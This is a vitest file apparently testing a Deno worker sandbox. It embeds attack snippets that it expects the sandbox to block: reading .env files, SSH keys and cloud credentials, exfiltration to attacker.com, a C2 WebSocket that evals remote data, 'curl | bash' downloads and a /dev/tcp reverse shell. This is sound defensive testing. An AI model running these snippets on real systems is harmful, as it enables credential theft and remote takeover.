/**
 * Security Isolation Demo Tests
 *
 * These tests demonstrate what malicious user code COULD do without worker isolation,
 * and verify that all such attempts are BLOCKED when running in the sandboxed worker.
 *
 * Run: deno task test packages/fsm-engine/tests/security-isolation-demo.test.ts
 */

import { describe, expect, it } from "vitest";
import type { Context } from "../types.ts";
import { WorkerExecutor } from "../worker-executor.ts";

// These tests require Deno's Worker API with permissions sandbox
const isDenoRuntime = typeof (globalThis as Record<string, unknown>).Deno !== "undefined";

const executor = new WorkerExecutor({ timeout: 5000, functionType: "action" });
const ctx: Context = { documents: [], state: "test" };
const sig = { type: "TEST" };

/**
 * ============================================================================
 * CATEGORY 1: Filesystem Access (Data Exfiltration / Tampering)
 * ============================================================================
 * WITHOUT ISOLATION: Malicious code could read Atlas config, workspace files,
 * credentials, SSH keys, or any file the process has access to.
 */
describe.skipIf(!isDenoRuntime)("Filesystem Attacks - ALL BLOCKED", () => {
  it("cannot read Atlas workspace config", async () => {
    // Attack: Read workspace.yml to discover agent configurations, MCP servers
    const code = `
      export default async () => {
        const config = await Deno.readTextFile('./workspace.yml');
        return config; // Exfiltrate config
      }
    `;
    await expect(executor.execute(code, "readWorkspaceConfig", ctx, sig)).rejects.toThrow();
  });

  it("cannot read .env files with secrets", async () => {
    // Attack: Read .env file containing API keys
    const code = `
      export default async () => {
        const env = await Deno.readTextFile('./.env');
        return env; // API keys, database passwords
      }
    `;
    await expect(executor.execute(code, "readEnv", ctx, sig)).rejects.toThrow();
  });

  it("cannot read SSH keys", async () => {
    // Attack: Steal SSH private keys for lateral movement
    const code = `
      export default async () => {
        const key = await Deno.readTextFile(Deno.env.get('HOME') + '/.ssh/id_rsa');
        return key;
      }
    `;
    await expect(executor.execute(code, "readSSH", ctx, sig)).rejects.toThrow();
  });

  it("cannot traverse directories to find secrets", async () => {
    // Attack: Directory traversal to find credentials
    const code = `
      export default async () => {
        const entries = [];
        for await (const entry of Deno.readDir('/')) {
          entries.push(entry.name);
        }
        return entries;
      }
    `;
    await expect(executor.execute(code, "traverseDir", ctx, sig)).rejects.toThrow();
  });

  it("cannot write malicious files", async () => {
    // Attack: Write backdoor scripts or modify config
    const code = `
      export default async () => {
        await Deno.writeTextFile('./backdoor.sh', '#!/bin/bash\\ncurl attacker.com/shell | bash');
        await Deno.chmod('./backdoor.sh', 0o755);
      }
    `;
    await expect(executor.execute(code, "writeBackdoor", ctx, sig)).rejects.toThrow();
  });

  it("cannot read Atlas internal state files", async () => {
    // Attack: Read internal Atlas storage (KV database, session history)
    const code = `
      export default async () => {
        const home = Deno.env.get('HOME');
        const data = await Deno.readFile(home + '/.atlas/kv.db');
        return new TextDecoder().decode(data);
      }
    `;
    await expect(executor.execute(code, "readAtlasKV", ctx, sig)).rejects.toThrow();
  });
});

/**
 * ============================================================================
 * CATEGORY 2: Environment Variables (Credential Theft)
 * ============================================================================
 * WITHOUT ISOLATION: User code could read API keys, database credentials,
 * cloud provider tokens stored in environment variables.
 */
describe.skipIf(!isDenoRuntime)("Environment Variable Attacks - ALL BLOCKED", () => {
  it("cannot read ANTHROPIC_API_KEY", async () => {
    // Attack: Steal LLM provider API key
    const code = `
      export default () => {
        return Deno.env.get('ANTHROPIC_API_KEY');
      }
    `;
    await expect(executor.execute(code, "readApiKey", ctx, sig)).rejects.toThrow();
  });

  it("cannot read DATABASE_URL", async () => {
    // Attack: Steal database connection string with credentials
    const code = `
      export default () => {
        return Deno.env.get('DATABASE_URL');
      }
    `;
    await expect(executor.execute(code, "readDbUrl", ctx, sig)).rejects.toThrow();
  });

  it("cannot enumerate all environment variables", async () => {
    // Attack: Dump all env vars to find secrets
    const code = `
      export default () => {
        return JSON.stringify(Object.fromEntries(Deno.env.toObject()));
      }
    `;
    await expect(executor.execute(code, "dumpEnv", ctx, sig)).rejects.toThrow();
  });

  it("cannot read AWS/GCP credentials from env", async () => {
    // Attack: Steal cloud provider credentials
    const code = `
      export default () => {
        return {
          awsKey: Deno.env.get('AWS_ACCESS_KEY_ID'),
          awsSecret: Deno.env.get('AWS_SECRET_ACCESS_KEY'),
          gcpKey: Deno.env.get('GOOGLE_APPLICATION_CREDENTIALS'),
        };
      }
    `;
    await expect(executor.execute(code, "readCloudCreds", ctx, sig)).rejects.toThrow();
  });
});

/**
 * ============================================================================
 * CATEGORY 3: Network Access (Data Exfiltration / C2)
 * ============================================================================
 * WITHOUT ISOLATION: Malicious code could send stolen data to attacker servers,
 * connect to command-and-control infrastructure, or make requests to internal services.
 */
describe.skipIf(!isDenoRuntime)("Network Attacks - ALL BLOCKED", () => {
  it("cannot exfiltrate data via HTTP", async () => {
    // Attack: Send stolen secrets to attacker server
    const code = `
      export default async () => {
        const secret = "STOLEN_API_KEY_XXXXX"; // Would be read from env
        await fetch('https://attacker.com/collect', {
          method: 'POST',
          body: JSON.stringify({ secret })
        });
      }
    `;
    await expect(executor.execute(code, "exfiltrate", ctx, sig)).rejects.toThrow();
  });

  it("cannot access internal Atlas API", async () => {
    // Attack: Call internal daemon APIs to escalate privileges
    const code = `
      export default async () => {
        const res = await fetch('http://localhost:8080/internal/admin');
        return res.json();
      }
    `;
    await expect(executor.execute(code, "internalApi", ctx, sig)).rejects.toThrow();
  });

  it("cannot connect to command-and-control server", async () => {
    // Attack: Establish C2 channel
    const code = `
      export default async () => {
        const ws = new WebSocket('wss://c2.attacker.com/control');
        return new Promise(resolve => {
          ws.onmessage = (e) => {
            eval(e.data); // Execute remote commands
            resolve('connected');
          };
        });
      }
    `;
    await expect(executor.execute(code, "c2connect", ctx, sig)).rejects.toThrow();
  });

  it("cannot scan internal network", async () => {
    // Attack: Port scan internal services (single fetch, no try/catch)
    const code = `
      export default async () => {
        // Even a single fetch fails due to no network permission
        const res = await fetch('http://localhost:8080/');
        return res.status;
      }
    `;
    await expect(executor.execute(code, "portScan", ctx, sig)).rejects.toThrow();
  });
});

/**
 * ============================================================================
 * CATEGORY 4: Process Execution (Remote Code Execution)
 * ============================================================================
 * WITHOUT ISOLATION: Malicious code could spawn arbitrary processes,
 * install malware, or take over the host system.
 */
describe.skipIf(!isDenoRuntime)("Process Execution Attacks - ALL BLOCKED", () => {
  it("cannot execute shell commands", async () => {
    // Attack: Run arbitrary shell commands
    const code = `
      export default async () => {
        const cmd = new Deno.Command('bash', {
          args: ['-c', 'curl attacker.com/malware.sh | bash']
        });
        await cmd.output();
      }
    `;
    await expect(executor.execute(code, "shellExec", ctx, sig)).rejects.toThrow();
  });

  it("cannot spawn reverse shell", async () => {
    // Attack: Establish reverse shell for interactive access
    const code = `
      export default async () => {
        const cmd = new Deno.Command('bash', {
          args: ['-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1']
        });
        await cmd.output();
      }
    `;
    await expect(executor.execute(code, "reverseShell", ctx, sig)).rejects.toThrow();
  });

  it("cannot kill other processes", async () => {
    // Attack: DoS by killing critical processes
    const code = `
      export default async () => {
        Deno.kill(1, 'SIGKILL'); // Kill init
      }
    `;
    await expect(executor.execute(code, "killProcess", ctx, sig)).rejects.toThrow();
  });

  it("cannot read /proc to inspect other processes", async () => {
    // Attack: Information disclosure via /proc
    const code = `
      export default async () => {
        const cmdline = await Deno.readTextFile('/proc/1/cmdline');
        return cmdline;
      }
    `;
    await expect(executor.execute(code, "procRead", ctx, sig)).rejects.toThrow();
  });
});

/**
 * ============================================================================
 * CATEGORY 5: Dynamic Code Loading (Supply Chain Attack)
 * ============================================================================
 * WITHOUT ISOLATION: Malicious code could import modules from attacker-controlled
 * URLs, enabling supply chain attacks and dynamic payload delivery.
 */
describe.skipIf(!isDenoRuntime)("Dynamic Import Attacks - ALL BLOCKED", () => {
  it("cannot import malicious modules from URL", async () => {
    // Attack: Load and execute remote malicious code
    const code = `
      export default async () => {
        const malware = await import('https://attacker.com/payload.js');
        return malware.pwn();
      }
    `;
    await expect(executor.execute(code, "importRemote", ctx, sig)).rejects.toThrow();
  });

  it("cannot import from npm with malicious packages", { timeout: 10_000 }, async () => {
    // Attack: Load compromised npm packages
    const code = `
      export default async () => {
        const pkg = await import('npm:evil-package@latest');
        return pkg.default();
      }
    `;
    await expect(executor.execute(code, "importNpm", ctx, sig)).rejects.toThrow();
  });

  it("cannot dynamically load local filesystem modules", async () => {
    // Attack: Load Atlas internal modules to gain capabilities
    const code = `
      export default async () => {
        const logger = await import('file:///workspace/packages/logger/src/logger.ts');
        return logger;
      }
    `;
    await expect(executor.execute(code, "importLocal", ctx, sig)).rejects.toThrow();
  });
});

/**
 * ============================================================================
 * CATEGORY 6: Resource Exhaustion (DoS)
 * ============================================================================
 * The worker timeout handles infinite loops, but let's verify other vectors.
 */
describe.skipIf(!isDenoRuntime)("Resource Exhaustion - Handled by Timeout + Isolation", () => {
  it("infinite loop is terminated by timeout", async () => {
    const shortTimeoutExecutor = new WorkerExecutor({ timeout: 100, functionType: "action" });
    const code = `
      export default () => {
        while (true) {} // CPU exhaustion
      }
    `;
    await expect(shortTimeoutExecutor.execute(code, "infiniteLoop", ctx, sig)).rejects.toThrow(
      "timed out",
    );
  });

  it("memory exhaustion is constrained to worker", async () => {
    // The worker will OOM before the parent process
    // This may hang or crash the worker, but won't affect the main process
    const shortTimeoutExecutor = new WorkerExecutor({ timeout: 500, functionType: "action" });
    const code = `
      export default () => {
        const arrays = [];
        while (true) {
          arrays.push(new Array(1000000).fill('x'));
        }
      }
    `;
    await expect(shortTimeoutExecutor.execute(code, "memoryExhaust", ctx, sig)).rejects.toThrow();
  });
});

/**
 * ============================================================================
 * POSITIVE TESTS: What user code CAN legitimately do
 * ============================================================================
 * Verify that isolation doesn't break legitimate use cases.
 */
describe.skipIf(!isDenoRuntime)("Legitimate Operations - All Allowed", () => {
  it("can use pure JavaScript", async () => {
    const code = `
      export default () => {
        const result = [1, 2, 3].map(x => x * 2).reduce((a, b) => a + b, 0);
        return result; // 12
      }
    `;
    const result = await executor.execute(code, "pureJS", ctx, sig);
    expect(result).toBe(12);
  });

  it("can read provided context.documents", async () => {
    const ctxWithDocs: Context = {
      documents: [{ id: "doc1", type: "test", data: { value: 42 } }],
      state: "active",
    };
    const code = `
      export default (ctx) => ctx.documents[0].data.value
    `;
    const result = await executor.execute(code, "readContext", ctxWithDocs, sig);
    expect(result).toBe(42);
  });

  it("can read provided event/signal data", async () => {
    const code = `
      export default (ctx, event) => event.data.message
    `;
    const sigWithData = { type: "TEST", data: { message: "hello" } };
    const result = await executor.execute(code, "readEvent", ctx, sigWithData);
    expect(result).toBe("hello");
  });

  it("can use async/await with Promise.resolve", async () => {
    const code = `
      export default async () => {
        const a = await Promise.resolve(10);
        const b = await Promise.resolve(20);
        return a + b;
      }
    `;
    const result = await executor.execute(code, "asyncAwait", ctx, sig);
    expect(result).toBe(30);
  });

  it("can mutate context via provided methods", async () => {
    const mutations: string[] = [];
    const ctxWithMethods: Context = {
      documents: [{ id: "x", type: "test", data: { count: 0 } }],
      state: "active",
      updateDoc: (id, data) => mutations.push(`update:${id}:${JSON.stringify(data)}`),
    };
    const code = `
      export default (ctx) => {
        ctx.updateDoc('x', { count: 1 });
      }
    `;
    await executor.execute(code, "mutate", ctxWithMethods, sig);
    expect(mutations).toHaveLength(1);
  });

  it("can use JSON operations", async () => {
    const code = `
      export default () => {
        const obj = { a: 1, b: [2, 3] };
        const str = JSON.stringify(obj);
        const parsed = JSON.parse(str);
        return parsed.b[1];
      }
    `;
    const result = await executor.execute(code, "json", ctx, sig);
    expect(result).toBe(3);
  });

  it("can use Math functions", async () => {
    const code = `
      export default () => Math.max(1, 5, 3) + Math.floor(3.7)
    `;
    const result = await executor.execute(code, "math", ctx, sig);
    expect(result).toBe(8);
  });

  it("can use Array/Object methods", async () => {
    const code = `
      export default () => {
        const arr = [1, 2, 3];
        const obj = { x: 10 };
        return {
          filtered: arr.filter(x => x > 1),
          keys: Object.keys(obj),
          spread: [...arr, 4],
        };
      }
    `;
    const result = (await executor.execute(code, "arrayObj", ctx, sig)) as {
      filtered: number[];
      keys: string[];
      spread: number[];
    };
    expect(result.filtered).toHaveLength(2);
    expect(result.keys[0]).toBe("x");
    expect(result.spread).toHaveLength(4);
  });
});
